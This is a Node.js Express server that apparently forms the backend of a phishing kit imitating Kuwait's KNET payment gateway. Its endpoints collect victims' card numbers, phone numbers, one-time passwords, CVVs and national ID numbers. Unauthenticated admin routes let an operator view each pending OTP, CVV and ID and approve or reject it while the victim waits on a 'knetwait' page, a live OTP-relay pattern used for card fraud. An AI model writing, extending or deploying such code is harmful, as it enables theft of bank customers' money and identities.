const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from root directory
app.use(express.static(path.join(__dirname)));

// In-memory database for payments
const payments = [];
const otpRequests = [];
const cvvRequests = [];
const hawettyRequests = [];

// Payment ID counter
let paymentIdCounter = 1000;

// API Routes

// Submit KNET Payment
app.post('/api/payment/knet', (req, res) => {
  const { phoneNumber, amount, bankName, cardNumber } = req.body;
  
  const payment = {
    id: paymentIdCounter++,
    phoneNumber,
    amount,
    bankName,
    cardNumber,
    status: 'pending_knet',
    createdAt: new Date(),
    type: 'knet'
  };
  
  payments.push(payment);
  
  res.json({
    success: true,
    paymentId: payment.id,
    message: 'KNET payment submitted'
  });
});

// Submit OTP
app.post('/api/payment/otp', (req, res) => {
  const { paymentId, otp, stage } = req.body;
  
  const payment = payments.find(p => p.id === parseInt(paymentId));
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  const otpRequest = {
    id: paymentId,
    paymentId,
    otp,
    stage,
    status: 'pending',
    createdAt: new Date()
  };
  
  otpRequests.push(otpRequest);
  payment.status = 'pending_otp';
  
  res.json({
    success: true,
    message: 'OTP submitted'
  });
});

// Submit CVV
app.post('/api/payment/cvv', (req, res) => {
  const { paymentId, cvv } = req.body;
  
  const payment = payments.find(p => p.id === parseInt(paymentId));
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  const cvvRequest = {
    id: paymentId,
    paymentId,
    cvv,
    status: 'pending',
    createdAt: new Date()
  };
  
  cvvRequests.push(cvvRequest);
  payment.status = 'pending_cvv';
  
  res.json({
    success: true,
    message: 'CVV submitted'
  });
});

// Submit Hawety (National ID)
app.post('/api/payment/hawety', (req, res) => {
  const { paymentId, nationalId } = req.body;
  
  const payment = payments.find(p => p.id === parseInt(paymentId));
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  const hawettyRequest = {
    id: paymentId,
    paymentId,
    nationalId,
    status: 'pending',
    createdAt: new Date()
  };
  
  hawettyRequests.push(hawettyRequest);
  payment.status = 'pending_hawety';
  
  res.json({
    success: true,
    message: 'Hawety submitted'
  });
});

// Admin: Get pending payments
app.get('/api/admin/pending-payments', (req, res) => {
  const pending = payments.filter(p => p.status === 'pending_knet');
  res.json(pending);
});

// Admin: Get pending OTP
app.get('/api/admin/pending-otp', (req, res) => {
  const pending = otpRequests.filter(o => o.status === 'pending');
  res.json(pending);
});

// Admin: Get pending CVV
app.get('/api/admin/pending-cvv', (req, res) => {
  const pending = cvvRequests.filter(c => c.status === 'pending');
  res.json(pending);
});

// Admin: Get pending Hawety
app.get('/api/admin/pending-hawety', (req, res) => {
  const pending = hawettyRequests.filter(h => h.status === 'pending');
  res.json(pending);
});

// Admin: Approve/Reject KNET
app.post('/api/admin/approve-knet', (req, res) => {
  const { paymentId, approved } = req.body;
  
  const payment = payments.find(p => p.id === parseInt(paymentId));
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  payment.status = approved ? 'knet_approved' : 'knet_rejected';
  
  res.json({
    success: true,
    message: approved ? 'KNET approved' : 'KNET rejected'
  });
});

// Admin: Approve/Reject OTP
app.post('/api/admin/approve-otp', (req, res) => {
  const { otpId, approved } = req.body;
  
  const otp = otpRequests.find(o => o.id === parseInt(otpId));
  if (!otp) {
    return res.status(404).json({ success: false, message: 'OTP not found' });
  }
  
  otp.status = approved ? 'approved' : 'rejected';
  
  res.json({
    success: true,
    message: approved ? 'OTP approved' : 'OTP rejected'
  });
});

// Admin: Approve/Reject CVV
app.post('/api/admin/approve-cvv', (req, res) => {
  const { cvvId, approved } = req.body;
  
  const cvv = cvvRequests.find(c => c.id === parseInt(cvvId));
  if (!cvv) {
    return res.status(404).json({ success: false, message: 'CVV not found' });
  }
  
  cvv.status = approved ? 'approved' : 'rejected';
  
  res.json({
    success: true,
    message: approved ? 'CVV approved' : 'CVV rejected'
  });
});

// Admin: Approve/Reject Hawety
app.post('/api/admin/approve-hawety', (req, res) => {
  const { hawettyId, approved } = req.body;
  
  const hawety = hawettyRequests.find(h => h.id === parseInt(hawettyId));
  if (!hawety) {
    return res.status(404).json({ success: false, message: 'Hawety not found' });
  }
  
  hawety.status = approved ? 'approved' : 'rejected';
  
  res.json({
    success: true,
    message: approved ? 'Hawety approved' : 'Hawety rejected'
  });
});

// Admin: Get stats
app.get('/api/admin/stats', (req, res) => {
  const total = payments.length;
  const completed = payments.filter(p => p.status === 'completed').length;
  const rejected = payments.filter(p => p.status.includes('rejected')).length;
  const pending = payments.filter(p => p.status.includes('pending')).length;
  
  res.json({
    totalPayments: total,
    completedPayments: completed,
    rejectedPayments: rejected,
    pendingPayments: pending,
    successRate: total > 0 ? ((completed / total) * 100).toFixed(2) : 0
  });
});

// Admin: Get transaction history
app.get('/api/admin/transactions', (req, res) => {
  const limit = parseInt(req.query.limit) || 10;
  const offset = parseInt(req.query.offset) || 0;
  
  const transactions = payments
    .sort((a, b) => b.createdAt - a.createdAt)
    .slice(offset, offset + limit);
  
  res.json({
    transactions,
    total: payments.length
  });
});

// Serve main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve KNET page
app.get('/knet', (req, res) => {
  res.sendFile(path.join(__dirname, 'knetpage.html'));
});

// Serve KNET wait page
app.get('/knetwait', (req, res) => {
  res.sendFile(path.join(__dirname, 'knetwait.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});

module.exports = app;
